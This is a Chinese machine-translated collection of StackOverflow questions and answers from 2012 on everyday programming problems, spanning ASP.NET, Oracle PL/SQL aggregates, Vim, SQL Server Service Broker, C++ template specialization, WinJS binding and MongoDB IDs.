# StackOverflow 问答 10603000-10603999

# asp.net - 如何在 aspx 网页上访问文本框的输入？

> ID：10603003
> 
> 赞同：0
> 
> 时间：2012-05-15T14:31:49.487
> 
> 标签：asp.net, c#-4.0

我是 asp .net 的初学者。在我的网页上，有几个文本框和一个提交按钮。有没有一种简单的方法可以访问数据并使用它来构建对象？文本框有名称和 ID，应该有一种方法可以通过名称和 ID 访问它们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:33:52.200

**编辑**

这是正常的 html 控件

```
<input type="text" class="text-box" id=xxx /> 
```

如果你想在你的代码隐藏文件中访问它，你需要向它添加`runat=server`属性

```
<asp:textbox> 
```

另一种是服务器端控制 asp.net 控制而不是 html 控制

我认为最好在说明编程之前先阅读 asp.net 的基础知识，因为这是您应该了解的非常基本的问题

**上一页**

第 1 步：使用 asp.net 文本框

```
<asp:Textbox id="textbox1" runat="server"></asp:Textbox> 
```

第 2 步：对于 asp.net，您只需在代码隐藏文件中写入

```
object.proertyname = texboxid.Text; 
```

阅读更多：[TextBox 类](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.textbox.aspx)

# php - 提取数据库信息

> ID：10603004
> 
> 赞同：0
> 
> 时间：2012-05-15T14:31:51.780
> 
> 标签：php, mysql, select

我有一个数据库由4个字段组成，例如：

```
name    date        Description      Amount 

Ali    05/04/2012   Salaries         2000$
Ali    08/04/2012   commission        100$
ALi    11/04/2012   Transport         100$
Ali    05/05/2012   Salaries         2000$
Ali    08/05/2012   commission        100$
ALi    11/05/2012   Transport         100$ 
```

如果我需要检索有关工资页面的信息和查询，对于Ali Only我需要将每个月的报表分开单独的行和当月总金额的总和

我需要知道如何在 mysql PHP Script 中执行此操作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T14:46:34.750

虽然这与您的问题无关，但要纠正您。

```
i have a database consists of4 fields for example: 
```

您将表称为数据库。请更正。它不是整个数据库，而是数据库中的一个表。

```
you are missing primary keys in your table 
```

每个表都有一个主键总是好的，主要是因为主键唯一标识表中的每一行。这里很好地解释了为什么你应该总是在你的表中使用主键[每个表都应该有一个主键吗？](https://stackoverflow.com/questions/840162/should-each-and-every-table-have-a-primary-key)

```
2000$ 
```

整数值的末尾不需要美元符号。因为数据库对该符号没有任何特殊含义，并且通过使用它，您将失去数据库可能为您执行的某些计算的能力。因为`2000$`与`2000`您希望数据库执行计算仅存储整数不同。如果您也想存储符号，则可以将其存储在另一列中。

# java - Java 获取远程机器时间

> ID：10603008
> 
> 赞同：-4
> 
> 时间：2012-05-15T14:32:05.943
> 
> 标签：java, time

我正在使用 Java 为公司的员工创建登录/身份验证程序。数据库位于程序的远程计算机上。当用户登录时，我必须节省登录时间。我想从远程机器上获取时间。这确保了权威的时间戳

远程机器运行windows2000 server。如何获取远程时间？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T16:52:44.793

[NOW()](http://www.w3schools.com/sql/func_now.asp)是 ODBC 规范函数。该链接指向 MySQL 版本；您的数据库的实现可能会有所不同。

# html - 我的 元素根本没有出现在 IE7 中

> ID：10603010
> 
> 赞同：0
> 
> 时间：2012-05-15T14:32:19.317
> 
> 标签：html, css, internet-explorer, internet-explorer-7

该网站是[http://goo.gl/e2Ipj](http://goo.gl/e2Ipj)

我根本无法在 IE7 中显示导航（顶部的六个链接），我尝试过使用高度和位置以及 z-index 并没有显示。

我也在使用：

```
<!--[if lt IE 9]>
<script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
<![endif]--> 
```

确保 nav 元素正确显示，因为它是 HTML5。我也在使用页眉/页脚，它们显示得很好。

有任何想法吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:47:31.573

`<nav>`正在页面上方呈现（准确地说，在页面上方 31 个像素）。这是因为 IE7 不支持`height: inherit`. 事实上它根本不支持`inherit`。

明确设置高度，导航会立即到位。

# eclipse - setSelectionProvider 在两个不同的控件上不起作用

> ID：10603015
> 
> 赞同：1
> 
> 时间：2012-05-15T14:32:42.950
> 
> 标签：eclipse, eclipse-plugin, jface, treeviewer

我正在尝试创建具有两个`TreeViewer`并排复合的 Eclipse 插件。单击每个`TreeViewer`内容 Eclipse 属性视图应提供适当的信息。现在我想为这两个 treeviewer 设置选择提供程序，因此我使用了

```
 setSelectionProvider(treeViewer1)
  setSelectionProvider(treeviewer2) 
```

但是只有第二个添加的 treeviewer 被设置，因为第一个被覆盖了。我正在从 Queue.java 类中启动这两个 treeviewer。因此，我`ISelectionProvider`在 Queue.java 上实现了如下接口：

```
public void addSelectionChangedListener(ISelectionChangedListener listener)
{
  selectionChangedListeners.add(listener);
}

public void
    removeSelectionChangedListener(ISelectionChangedListener listener)
{
  selectionChangedListeners.remove(listener);
}

private void fireSelectionChanged(final SelectionChangedEvent event)
{
  Object[] listeners = selectionChangedListeners.getListeners();
  for (int i = 0; i < listeners.length; ++i)
  {
     final ISelectionChangedListener l =
         (ISelectionChangedListener) listeners[i];
     Platform.run(new SafeRunnable()
     {
        public void run()
        {
           l.selectionChanged(event);
        }

        @Override
        public void handleException(Throwable e)
        {
           removeSelectionChangedListener(l);
        }
     });
   }
}

   public void setSelection(ISelection selection)
   {
       fireSelectionChanged(new SelectionChangedEvent(this, selection));
    }

     public ISelection getSelection()
    {
      ArrayList<Object> list = new ArrayList<Object>();
     Object o = getProperties();
     if (o instanceof IPropertySource)
         list.add(o);
     return new StructuredSelection(list);
   } 
```

谁能帮我解决这个问题。我会很感激。提前致谢。托尔。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T16:48:13.493

您的视图必须编写一个选择提供程序包装器或调解器，以委托给当前具有焦点的查看器。然后您的视图将设置如下：

```
SelectionProviderWrapper wrapper = new SelectionProviderWrapper();
wrapper.addViewer(treeViewer1);
wrapper.addViewer(treeViewer2);
getSite().setSelectionProvider(wrapper); 
```

我将查看[`org.eclipse.jdt.internal.ui.viewsupport.SelectionProviderMediator`](http://git.eclipse.org/c/jdt/eclipse.jdt.ui.git/tree/org.eclipse.jdt.ui/ui/org/eclipse/jdt/internal/ui/viewsupport/SelectionProviderMediator.java)多个 JFace 查看器的选择提供程序的示例。

# asp.net-mvc-3 - 扩展 MVC3 razor Html.LabelFor 以添加 css 类

> ID：10603016
> 
> 赞同：14
> 
> 时间：2012-05-15T14:32:43.433
> 
> 标签：asp.net-mvc-3, c#-4.0, razor

我正在尝试在 EditorTemplate 上向 Html.LabelFor 添加一个 CSS 类

```
 @Html.LabelFor(model => model.Name, new { @class = "myLabel" }) 
```

例如，我的期望：label 应该选择 css 类。

为此，我尝试使用以下代码扩展标签，但我的标签未显示。我在这里做错了什么？

```
 public static class LabelExtensions
    {
        public static MvcHtmlString LabelFor<TModel, TValue>(this HtmlHelper<TModel> html, Expression<Func<TModel, TValue>> expression, object htmlAttributes)
        {
            return html.LabelFor(expression, null, htmlAttributes);
        }

        public static MvcHtmlString LabelFor<TModel, TValue>(this HtmlHelper<TModel> html, Expression<Func<TModel, TValue>> expression, string labelText, object htmlAttributes)
        {
            return html.LabelHelper(
                ModelMetadata.FromLambdaExpression(expression, html.ViewData),
                ExpressionHelper.GetExpressionText(expression),
                HtmlHelper.AnonymousObjectToHtmlAttributes(htmlAttributes),
                labelText);
        }

        private static MvcHtmlString LabelHelper(this HtmlHelper html, ModelMetadata metadata, string htmlFieldName, IDictionary<string, object> htmlAttributes, string labelText = null)
        {
            var str = labelText
                ?? (metadata.DisplayName
                ?? (metadata.PropertyName
                ?? htmlFieldName.Split(new[] { '.' }).Last()));

            if (string.IsNullOrEmpty(str))
                return MvcHtmlString.Empty;

            var tagBuilder = new TagBuilder("label");
            tagBuilder.MergeAttributes(htmlAttributes);
            tagBuilder.Attributes.Add("for", TagBuilder.CreateSanitizedId(html.ViewContext.ViewData.TemplateInfo.GetFullHtmlFieldName(htmlFieldName)));
            tagBuilder.SetInnerText(str);

            return tagBuilder.ToMvcHtmlString(TagRenderMode.Normal);
        }

        private static MvcHtmlString ToMvcHtmlString(this TagBuilder tagBuilder, TagRenderMode renderMode)
        {
            return new MvcHtmlString(tagBuilder.ToString(renderMode));
        }
    } 
```

例如，如果我没有指定 css 类 `@Html.LabelFor(model => model.Name)` ，那么它会显示标签。但我无法将 css 应用于我的标签。我想在页面加载时以蓝色显示标签。然后使用 jquey 根据用户操作更改标签样式。一切都很好，在我的页面上，除了我无法扩展和添加 css 类到我的标签。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-05-15T14:36:58.373

我怀疑您忘记将定义此 LabelExtensions 类的名称空间带入视图的范围内。例如，如果这个类是在`MyProject.Extensions`命名空间内定义的：

```
namespace MyProject.Extensions
{
    public static class LabelExtensions
    {
        ...
    }
} 
```

确保您已将此命名空间纳入范围：

```
@using MyProject.Extensions
@model MyViewModel
...
@Html.LabelFor(model => model.Name, new { @class = "myLabel" }) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-04-29T12:30:54.970

您正在使用 html.LabelHelper

但是您已经定义了自己的 LabelHelper 方法，所以使用它 =)

# oracle - oracle plsql 聚合错误：ORA-06502：字符串缓冲区太小

> ID：10603019
> 
> 赞同：0
> 
> 时间：2012-05-15T14:32:56.630
> 
> 标签：oracle, plsql, aggregate, ora-06502

我编写了一个简单的聚合函数，它应该通过聚合生成的 csv 字符串中的不同值来处理包含 csv 文本的列。当它应该返回结果时，当它出现 ORA-06502 错误时，这些函数似乎一直工作到最后。

这是代码：

类型定义：

```
create or replace type array_union_typ as object (

union_agg nvarchar2(1000),

static function ODCIAggregateInitialize(sctx  in out array_union_typ)
                return number,

member function ODCIAggregateIterate   (self  in out array_union_typ,
                                        value in nvarchar2)
                return number,

member function ODCIAggregateTerminate (self         in array_union_typ,
                                        return_value out nvarchar2,
                                        flags        in number)
                return number,

member function ODCIAggregateMerge(self in out array_union_typ,
                                   ctx2 in array_union_typ)
                return number,

static function agg_union(arg1 in nvarchar2,
                          arg2 in nvarchar2)
                return nvarchar2
); 
```

身体：

```
create or replace type body array_union_typ  is

static function ODCIAggregateInitialize(sctx in out array_union_typ
                                     ) return number is
begin
    sctx := array_union_typ(null);
    return ODCIConst.Success;
end;

member function ODCIAggregateIterate(self in out array_union_typ,
                                     value in nvarchar2
                                     ) return number is
begin
    union_agg := array_union_typ.agg_union(union_agg, value);
    return ODCIConst.Success;
end;

member function ODCIAggregateTerminate(self in array_union_typ,
                                       return_value out nvarchar2,
                                       flags in number
                                       ) return number is
begin
    dbms_output.put_line('result: '''|| union_agg || ''', length:' || length(union_agg)); --this still prints
    return_value := self.union_agg; -- <-- this is where the error is indicated
    --return_value := 'x'; -- returning this still gives the error.
    return ODCIConst.Success;
end;

member function ODCIAggregateMerge(self in out array_union_typ,
                                   ctx2 in array_union_typ
                                   ) return number is
begin
    union_agg := array_union_typ.agg_union(union_agg, ctx2.union_agg);
    return ODCIConst.Success;
end;

static function agg_union(arg1 in nvarchar2,
                          arg2 in nvarchar2)
                return nvarchar2 is
    result nvarchar2(1000);
    orig nvarchar2(1000);
begin
    dbms_output.enable;
    orig := replace(arg1||','||arg2, chr(0));

    FOR rec IN (SELECT DISTINCT(regexp_substr(orig, '[^,]+', 1, level)) AS a
           FROM dual CONNECT BY regexp_substr(orig, '[^,]+', 1, level) IS NOT NULL ORDER BY a) LOOP
      IF result IS NOT NULL THEN
        result := result || ',' || rec.a;
      ELSE
        result := rec.a;
      END IF;
    END LOOP;
    --dbms_output.put_line('endwith: ''' || result || '''');
    RETURN substr(result,1,1000);
end;
end; 
```

这是一个测试表和数据：

```
SQL> desc uniontest
 Name                                      Null?    Type
 ----------------------------------------- -------- ----------------------------
 I                                                  NVARCHAR2(50)

SQL> select * from uniontest;

I
--------------------------------------------------
a
a
b,c
b,d,e 
```

最后，如果我尝试使用聚合函数会发生这种情况：

```
SQL> select array_union(i) from uniontest;
select array_union(i) from uniontest
*
ERROR at line 1:
ORA-06502: PL/SQL: numeric or value error: character string buffer too small
ORA-06512: at "M35456.ARRAY_UNION_TYP", line 25

result: 'a,b,c,d,e', length:9 
```

如果我只是在违规行中传递一个像“x”这样的字符串，我仍然会得到同样的错误。只有在空结果上它才会消失。我被难住了，没有想法。

谢谢你的帮助。

顺便说一句，如果有人知道为什么我在 agg_union 函数参数中添加了 \0 字符，我也很想知道这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-16T04:46:49.950

如果我没记错的话

```
 SELECT DISTINCT(regexp_substr(orig, '[^,]+', 1, level)) AS a
       FROM dual CONNECT BY regexp_substr(orig, '[^,]+', 1, level) IS NOT NULL ORDER BY a) 
```

导致无限数量的行，因为`CONNECT BY`条件不依赖于行。

由于您循环将结果附加到字符串，因此字符串变得很大。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-16T09:42:17.463

这些`ODCIaggregate`方法似乎不太适合`nvarchar2`; 您似乎没有做错任何事情，因为如果将它们全部更改为`varchar2`.

如果您在 11gR2 上，因此有`listagg`可用的功能 - 但目前没有使用它，因为您需要找出不同的值 - 您可以将其与现有`regexp_substr`功能结合使用，因此您不需要自己的类型/功能：

```
SELECT REPLACE(LISTAGG(a, ',') WITHIN GROUP (ORDER BY a), chr(0), '')
FROM (
    SELECT DISTINCT(regexp_substr(i, '[^,]+', 1, level)) AS a
    FROM uniontest CONNECT BY regexp_substr(i, '[^,]+', 1, level) IS NOT NULL
    ORDER BY a
); 
```

...根据您的数据给出：

```
REPLACE(LISTAGG(A,',')WITHINGROUP(ORDERBYA),CHR(0),'')
------------------------------------------------------
a,b,c,d,e 
```

在早期版本中，您可以`SELECT REPLACE(WM_CONCAT(a), chr(0), '')`改用。

（`chr(0)`here 和 the `\0`in your question 似乎与 相关`nvarchar2`，但其他人需要补充细节......）

# vim - VIM：关闭自动完成但保留提示

> ID：10603021
> 
> 赞同：6
> 
> 时间：2012-05-15T14:33:07.520
> 
> 标签：vim

我是 VIM 新手，我来自 Eclipse/VS 世界。

似乎当我使用**Ctrl + N**时，它会自动完成该功能，当我输入*sys*（我打算获取*syslog*）时，它会自动将名称自动完成为*sysSync*（提示列表中的第一项是 sysSync）。

问题是系统自动完成到 sysSync。当我继续输入 l 时，它变成了 sysSyncl，而不是 sysl。我发现它太烦人了。

我的问题是如何关闭自动完成但打开提示窗口，例如当我键入*sys*时，它保持*sys*不变，但给了我可供选择的提示列表？

我应该在我的`.vimrc`文件中放什么？

非常感谢你花时间陪伴。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T15:19:39.560

看看[http://vim.wikia.com/wiki/Make_Vim_completion_popup_menu_work_just_like_in_an_IDE](http://vim.wikia.com/wiki/Make_Vim_completion_popup_menu_work_just_like_in_an_IDE)。它描述了一种设置，其中仅选择了弹出菜单的第一个条目（因此您可以通过 CTRL-Y 快速接受它），但尚未插入到文本中（因此您可以继续输入）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T14:49:41.103

我不知道该怎么做*，*但请记住，您可以*按住 CTRL并使用**N*循环浏览建议。

# java - 如何使用java类在jsp页面中显示数据库中的值？

> ID：10603027
> 
> 赞同：1
> 
> 时间：2012-05-15T14:33:22.530
> 
> 标签：java, database, jsp, javabeans

我有一个包含表和值的数据库。我想获取该数据并将其显示在 jsp 页面中。不想在jsp页面中编写查询，分离java类，创建对象值然后在html中显示它，任何人都可以帮助我正确的代码结构。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:18:21.147

查找 servlet。当您提交页面时，您可以使用 servlet 访问数据库并将结果存储在您的请求对象中。然后，您可以在 jsp 页面中使用该请求对象来显示结果。

这是一个非常简单的方法。如果您想以正确的方式进行操作，您可能需要考虑 Struts MVC 模式。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T16:53:07.393

正确的方法是创建一个 DAO 并将其用于数据库的所有输入/输出。javaStudent 解释的控制器实例化一个DAO 类并将数据存储在Java Bean 中。在这里，您可以获得有关所有这些以及基于 MVC 编写 Web 应用程序的正确方法的良好信息：

[http://pdf.coreservlets.com/](http://pdf.coreservlets.com/)

我希望它可以帮助！

# sql-server-2008 - 代理上的 SQL Server 2008 表更改（插入/更新/删除）通知推送

> ID：10603041
> 
> 赞同：0
> 
> 时间：2012-05-15T14:34:32.150
> 
> 标签：sql-server-2008, notifications, publish-subscribe, service-broker

我有一个相当复杂且大型的数据库，其中包含大约 3000 多个对象（表/触发器/sps 组合）。我继承了这个数据库并对其进行重组可能需要 3-4 年的时间。同时，我需要为这些表上的任何插入/更新/删除实现 pub sub 功能。给定数量的表和现有查询*可能*查询通知（和 SQL 依赖项）将不起作用。我正在寻找的是一种在服务代理上推送更改（表中更改的内容 - 如记录 PK 和表名）的方法，以便我可以使用外部激活器然后检索更改，然后从那时起使用我的自定义 pub sub向前。

除了在服务代理上推送更改通知的方式之外，我几乎排好了所有的鸭子。

任何帮助/指针表示赞赏。谢谢。纳米PS。我确实四处寻找类似的帖子，但确实遇到了一些，他们提到的 MSDN 文章似乎都被删除了——不确定 MSDN 网站上发生了什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:48:06.247

对于外部激活器，请查看[Microsoft SQL Server 2008 Feature Pack](http://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=8824) -“Microsoft SQL Server 2008 R2 Service Broker External Activator”。

对于控制台应用程序（处理消息），好主意是关注[codeplex](http://msftsbprodsamples.codeplex.com/)。有很好的例子。

放置事件通知（通知，将由外部激活器服务使用）代码如下所示：

```
Create Queue ExternalActivatorQueue;
Create Service ExternalActivatorService On Queue ExternalActivatorQueue
([http://schemas.microsoft.com/SQL/Notifications/PostEventNotification])

Create Event Notification NotifyExternalActivator
On Queue dbo.ProcessQueue
For QUEUE_ACTIVATION
To Service 'ExternalActivatorService', 'current database' 
```

在队列中发送消息：

```
 Declare @h UniqueIdentifier;
    Declare @x xml = '<tag/>';
    Begin Dialog Conversation @h
    From Service MyTableService
        To Service 'ProcessService'
    With Encryption = OFF;

    Send On Conversation @h(@x) 
```

我为使它工作所做的所有步骤都[在这里](http://www.sqlblog.lv/2012/03/service-broker-areja-aktivizacija.html)，但只是在拉脱维亚语:)。实际上几乎有你需要的（当数据插入表时发送消息的触发器..）。

# html - 没有填充或边距的旋转元素未粘在侧面

> ID：10603042
> 
> 赞同：3
> 
> 时间：2012-05-15T14:34:32.277
> 
> 标签：html, css

我有一个`div`在容器内旋转的。我无法将旋转`div`“粘”到容器的最左侧。请看[这个小提琴](http://jsfiddle.net/qfWH8/1/)，看看我的意思。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T14:39:52.527

您需要将`transform-origin`(`-webkit-transform-origin`等) 设置为`top left`，并`translateX(-100px)`在旋转后添加 ( 像这样：`transform: rotate(-90deg) translateX(-100px)`)。否则，您将围绕中心点旋转（在旋转的元素上设置背景，您会看到）。

旁注，确保过滤器未在 IE9 中应用（使用条件注释），否则两者都会应用，结果是一个黑框。

[更新的小提琴](http://jsfiddle.net/qfWH8/7/)

# c++ - 鸭子在 C++ 中键入（通过其非类型模板参数的值来特化模板函数）

> ID：10603043
> 
> 赞同：2
> 
> 时间：2012-05-15T14:34:33.497
> 
> 标签：c++, templates

有一种鸭子打字，我做

```
template<bool b>
struct A{
  static template<typename V> f1(V*, [other params]);     
  static template<typename V> f2(V*, [other params]);            
};

template<> template<typename T>
void A<false>::f1(V*, [other params]){}

template<> template<typename T>
void A<true>::f1(V*, [other params]){
   ...some code...
}  

template<int flags>
struct V{
  void f(){
     A<flags&Some compile time conditions>::f1 (this,[params]);
     A<flags&Some compile time conditions>::f2 (this,[params]); 
  } 
}; 
```

你认为有没有更优雅的解决方案，不是[模板类，函数](https://stackoverflow.com/questions/2349995/template-class-function-specialization)特化 （我不想给函数添加额外的参数）

我想做类似的事情

```
template<int X> struct C{
 void f(){std::cout<<"C::f"<<std::endl;};
};

template<> struct C<0>{
};

template<int X> struct D{
 C<X> c;

 template<bool b>
 void f();

 void g(){
  f<X!=0>();
 }

};

template<>
template<int X> 
void D<X>::f<true>{
c.f();
};

template<int X>  
 template<>
 void D<X>::f<false>{};

int main(){
 D<3> ch;
 ch.g();

 D<0> cn;
 cn.g();

} 
```

但这不是有效的代码，我收到错误：template-id 'f' used as a declarator。

有没有办法通过其非类型模板参数的值来专门化模板函数？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:13:10.933

```
template<>
template<int X> 
void D<X>::f<true>(){
c.f();
};

template<int X>  
 template<>
 void D<X>::f<false>(){}; 
```

这是非法的（所有尝试都是）。当您专门化成员函数模板时，它的封闭类也必须专门化。

但是，您可以通过将函数包装在一个模板结构中来轻松克服这个问题，该结构将接受其模板参数。就像是

```
template <int X, bool B>
struct DXF;

template <int X>
struct DXF<X, true>
{
  static void f() { // B is true!
  }
};

template <int X>
struct DXF<X, false>
{
  static void f() { // B is false!
  }
}; 
```

并用`DXF<X, (X!=0)>::f()`.

但是，您似乎只想专注于`X==0`. 在这种情况下，您可以只专注于：

```
template <>
void D<0>::f() {} 
```

请注意，`f`在这种情况下*不是*成员模板。

* * *

您可以选择的另一个选择是重载。您可以将您包装`int`在某个模板的参数列表中，如下所示：

```
template<int X> struct D{
 C<X> c;

 void f(std::true_type*) { ... true code ... }
 void f(std::false_type_*) { ... false code ... }
 void g(){
  f((std::integral_constant<bool, X!=0>*)0);
 } 
```

[请注意， true_type 和 false_type 只是`typedef`s`std::integral_constant<bool, true>`和`false`，分别。]

# vim - 在 Vim 中查看 \n 和 \r 字符？

> ID：10603045
> 
> 赞同：7
> 
> 时间：2012-05-15T14:34:40.967
> 
> 标签：vim, end-of-line

有没有办法让 vim 中的 \n 或 \r 字符可见？（我希望能够查看我正在查看的 csv 文件是否仅在行尾使用 \n 或 \r 和 \n 。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T15:23:26.423

```
:setl fileformat? 
```

`dos`表示 CR-LF（始终如一；如果只有某些行同时包含两者，它将被列为`unix`，并且您会`^M`在这些行的末尾看到字符），`unix`表示 LF；`mac`仅表示 CR 换行符。

# javascript - 使用 javascript 将数据绑定到 Metro 风格应用程序中的 observable

> ID：10603047
> 
> 赞同：0
> 
> 时间：2012-05-15T14:34:44.977
> 
> 标签：javascript, windows-8, winjs

我在 Windows 8 上的 Metro javascript 应用程序中遇到数据绑定问题。

在 **构建 xxxx **

我创造了我想绑定的价值

```
var someValue = WinJS.Binding.as({ primitive : 1 }); 
```

我实际上已经把它放在全局范围内以排除事情

然后只需设置一个简单的回调以每 5 秒更新一次此值

```
setInterval(function () { someValue. primitive++ }, 5000);
WinJS.Binding.processAll(); 
```

这是在页面js文件的ready函数中

然后在 HTML 文件中只是一个简单的 h1 标签

```
<h1 data-win-bind="innerText : someValue.primitive">Test</h1> 
```

当此页面运行时，它最初会进行数据绑定 - 因此 h1 标记显示 1 但从不显示其他任何内容。回调确实受到打击，并且在任何时候我都可以检查 someValue 并且它看起来正确。我尝试在 someValue 对象上使用 setProperty 和 updateProperty ，但没有任何区别。

我会很感激任何建议。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-16T08:47:56.757

这似乎是全局的问题。我尝试了其他一些方法，但您似乎无法将数据绑定到具有全局范围的对象。

```
<h1 data-win-bind="innerText : variable">Test</h1> 
```

如果您要绑定的变量具有全局范围，则“变量”不能在全局范围内，它只是中断。

但是如果你只是命名空间是说 variable.variable 那么它可以工作 - 但是因为它已经被命名空间所以你必须将它作为数据上下文传递。

WinJS.Binding.processAll（document.body，变量）

我的问题是我有一个 ViewModel.Login、ViewModel.Basket 对象，我只想绑定 ViewModel，然后将相关部分绑定到他们需要的位。

// ViewModel.Test.test.guidePrice = "£3.00";

作品 `<h1 data-win-bind="innerText : test.guidePrice">Test</h1>` `WinJS.Binding.processAll(document.getElementById('basketPrice'),ViewModel.Test);`

不工作 `<h1 data-win-bind="innerText : Test.test.guidePrice">Test</h1>` `WinJS.Binding.processAll(document.getElementById('basketPrice'),ViewModel);`

希望这可以帮助任何有相同/相似问题的人！

# android - Android USB 驱动程序未安装

> ID：10603048
> 
> 赞同：0
> 
> 时间：2012-05-15T14:34:46.457
> 
> 标签：android

我正在尝试将我的 HTC Wildfire S 连接到 Windows 7 64 位开发版。当它通过 USB 电缆插入时，Windows 通知安装驱动程序失败。HTC 同步软件也无法安装。

任何想法如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T14:40:50.687

检查手机的完整性，也许是 CD，可能它包含所需的驱动程序。如果不尝试从此处安装 google oem usb 驱动程序：

[http://developer.android.com/sdk/oem-usb.html](http://developer.android.com/sdk/oem-usb.html)

# javascript - 传递“this”dom元素-jquerymobile，zend-

> ID：10603049
> 
> 赞同：0
> 
> 时间：2012-05-15T14:34:47.270
> 
> 标签：javascript, zend-framework, jquery-mobile

好吧，今天我正在处理一个意想不到的问题！

我正在使用什么：zend jquerymobile

目标：该按钮应保持“按下”状态，直到按下另一个按钮。

```
<div data-role='controlgroup' data-type='horizontal' data-mini='true'>
<a id='btnMap' class='ui-btn-active' href='javascript:flipViews(this)' data-role='button'>Map</a>
<a id='btnListe' href='javascript:flipViews(this)' data-role='button'>Liste</a>
</div> 
```

我得到什么：

当我警告函数中的对象时，它是一个“对象 DOMWindow”对象，如果我警告 objectparam.id，我得到未定义。

我想我应该（我想）得到元素对象！

p

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T14:45:25.647

`href`使用从,调用的函数`this`是窗口对象。

您应该在外部 JavaScript 中绑定点击处理程序：

```
$('#btnListe, #btnMap').on('click', flipViews); 
```

并且您的`flipViews`方法将`this`在方法中使用，而不是您传入的参数。

不要使用内联 JavaScript，尤其是 jQuery！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T14:45:50.103

为此，您最好使用不显眼的 javascript。与其在 HTML 中分配事件回调，不如使用 jquery 的事件绑定 API 分配它：

```
$('#btnMap').click(function(e) {

  // prevents the click from navigating page to the href attribute
  e.preventDefault();

  // call your function with "this", which jQuery scopes to the clicked element
  flipViews(this);
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T14:41:26.380

你应该把 JavaScript 放在里面`onclick`：

```
<a id='btnListe' href='#' onclick='flipViews(this);' data-role='button'>Liste</a> 
```

# ruby - MongoDB 嵌入文档 BSON ID

> ID：10603053
> 
> 赞同：0
> 
> 时间：2012-05-15T14:35:00.293
> 
> 标签：ruby, mongodb

我有一个网络应用程序，我在其中创建了一个用于教育的嵌入式文档。工作文件看起来像这样：

```
"educations" : [
    {
        "school" : "Brandywine High School",
        "major" : "Testingasdf",
        "grad_year" : ISODate("1979-01-01T00:00:00Z"),
        "school_type" : "Graduate",
        "_id" : ObjectId("4fb26c9ce5be08208b000ce4")
    }
],
"email" : "user@domain.com", 
```

教育哈希包含作业的详细信息。我注意到，如果我创建没有 ID 的哈希：

```
User.collection.update(
  { _id: @user.id },
  { :$push => { educations: education } },
  { safe: true }
) 
```

我从 Rails 控制台查询教育，ID 每次都会改变：

```
irb(main):004:0> User.brandon.educations.map(&:id)
 => [BSON::ObjectId('4fb26e13e5be082384000007')]
irb(main):005:0> User.brandon.educations.map(&:id)
 => [BSON::ObjectId('4fb26e13e5be082384000009')] 
```

但是，如果我这样做：

```
User.collection.update(
  { _id: @user.id },
  { :$push => { educations: BSON::ObjectId.create_pk(education) } },
  { safe: true }
) 
```

每次从控制台查询的 ID 都是相同的。因此，我无法参考在浏览器中编辑嵌入式文档的教育。

创建嵌入式文档时是否总是需要提供 BSON ID？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T14:52:11.690

如果您没有在 _id 字段中提供某种标识符（可能是字符串、int 等），那么 MongoDB 会自动为您创建一个标识符，以使文档唯一（以便可以通过_ID）。_id 上通常有一个唯一索引，因此如果文档不是唯一的，则插入将失败（或者将更新现有文档等）。

MongoDB 使文档唯一的策略是使用 ObjectID，因为它们是全局唯一的。每次您创建它们时它们也是不同的——这就是它们在全球范围内的独特之处。

长话短说：如果您有一个使您的文档 100% 唯一的密钥（在您的示例中可能是 :school），则将其存储为 _id，MongoDB 将为您完成艰苦的工作。

# vb.net - DataGridView 组合框列

> ID：10603058
> 
> 赞同：1
> 
> 时间：2012-05-15T14:35:31.573
> 
> 标签：vb.net, datagridview, combobox, datatable

我有一个由数据集填充的 datagridview。我正在尝试添加 3 列，其中包含组合框以及它们自己的数据源，这也将是一个数据集。

在这里删除 CRUD 控件是我尝试添加组合框列的方式。

```
Private Sub GenComboBoxColumns()
    Dim priorityTypesDS As New DataSet()
    Dim serviceBoardsDS As New DataSet()
    Dim serviceTypesDS As New DataSet()

    priorityTypesDS = _objhost.GetDataSet("SELECT DISTINCT abc FROM foo ORDER BY abc")
    serviceBoardsDS = _objhost.GetDataSet("SELECT DISTINCT abc FROM bar ORDER BY abc")
    serviceTypesDS = _objhost.GetDataSet("SELECT DISTINCT abc, xyz FROM foobar ORDER BY xyz")

    If dataGridView_monitorMapping IsNot Nothing AndAlso dataGridView_monitorMapping.Rows.Count > 0 Then
        Dim col_priority As New DataGridViewComboBoxColumn
        Dim col_serviceBoard As New DataGridViewComboBoxColumn
        Dim col_serviceType As New DataGridViewComboBoxColumn

        col_priority.DataSource = priorityTypesDS
        col_serviceBoard.DataSource = serviceBoardsDS
        col_serviceType.DataSource = serviceTypesDS

        dataGridView_monitorMapping.Columns.AddRange(col_priority, col_serviceBoard, col_serviceType)

    End If 
```

结束子

但是，我实际上生成了许多列，这些列在 datagridview 中包含的视图区域（超过 7 列！）当它们应该只有 3 时。

